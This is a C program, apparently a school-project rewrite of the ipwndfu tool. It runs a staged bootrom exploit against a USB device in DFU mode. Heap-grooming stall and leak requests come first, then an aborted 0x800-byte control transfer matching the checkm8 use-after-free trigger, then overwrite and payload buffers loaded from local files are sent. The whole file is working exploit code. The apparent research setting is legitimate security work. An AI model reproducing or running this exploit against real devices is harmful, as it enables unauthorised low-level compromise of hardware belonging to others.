#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "libusb_helpers.h"

int complete_stage(int stage_function(libusb_device_handle *handle))
{
    int ret;
    unsigned char usb_serial_buf[128];

    libusb_context *usb_ctx = NULL;
    struct libusb_device_bundle usb_bundle;
    struct libusb_device_handle *usb_handle;
    struct libusb_device_descriptor usb_desc;

    libusb_init(&usb_ctx);
    get_test_device(usb_ctx, &usb_bundle);

    if(usb_bundle.handle == NULL)
    {
        libusb_exit(usb_ctx);
        printf("Could not find device\n");
        return 1;
    }

    usb_handle = usb_bundle.handle;
    usb_desc = usb_bundle.descriptor;

    libusb_get_string_descriptor_ascii(usb_handle, usb_desc.iSerialNumber, usb_serial_buf, sizeof(usb_serial_buf));
    printf("Found device with serial %s\n", usb_serial_buf);

    ret = libusb_set_auto_detach_kernel_driver(usb_handle, 1);
    if(ret > 0)
    {
        printf("%s\n", libusb_error_name(ret));
        return ret;
    }

    ret = stage_function(usb_handle);

    libusb_close(usb_handle);
    libusb_exit(usb_ctx);
    return ret;
}

int stage1_function(libusb_device_handle *handle)
{
    unsigned int i;

    stall(handle);
    for(i = 0; i < 5; i++)
    {
        no_leak(handle);
    }
    usb_req_leak(handle);
    no_leak(handle);

    libusb_reset_device(handle);

    return 0;
}

int stage2_function(libusb_device_handle *handle)
{
    unsigned char databuf[0x800];
    memset(databuf, 'A', 0x800);

    libusb1_async_ctrl_transfer(handle, 0x21, 1, 0, 0, databuf, 0x800, 1);
    libusb1_no_error_ctrl_transfer(handle, 0x21, 4, 0, 0, NULL, 0, 0);

    libusb_reset_device(handle);

    return 0;
}

int stage3_function(libusb_device_handle *handle)
{
    unsigned char overwrite_buf[1524];
    FILE *overwrite_file = fopen("/home/grg/Projects/School/NCSU/iphone_aes_sc/ipwndfu_rewrite_c/bin/overwrite.bin", "r");
    fread(overwrite_buf, 1524, 1, overwrite_file);
    fclose(overwrite_file);

    unsigned char payload_buf[2400];
    FILE *payload_file = fopen("/home/grg/Projects/School/NCSU/iphone_aes_sc/ipwndfu_rewrite_c/bin/payload.bin", "r");
    fread(payload_buf, 2400, 1, payload_file);
    fclose(payload_file);

    usb_req_stall(handle);
    usb_req_leak(handle);

    libusb1_no_error_ctrl_transfer(handle, 0, 0, 0, 0, overwrite_buf, 1524, 100);
    libusb1_no_error_ctrl_transfer(handle, 0x21, 1, 0, 0, payload_buf, 2048, 100);
    libusb1_no_error_ctrl_transfer(handle, 0x21, 1, 0, 0, &payload_buf[2048], 352, 100);

    libusb_reset_device(handle);
    return 0;
}

int check_function(libusb_device_handle *handle)
{
    return 0;
}

int main()
{
    int ret = complete_stage(stage1_function);
    if(ret == 0)
    {
        ret = complete_stage(stage2_function);
        usleep(500000);
    }

    if(ret == 0)
    {
        ret = complete_stage(stage3_function);
        usleep(500000);
    }

    complete_stage(check_function);
    return ret;
}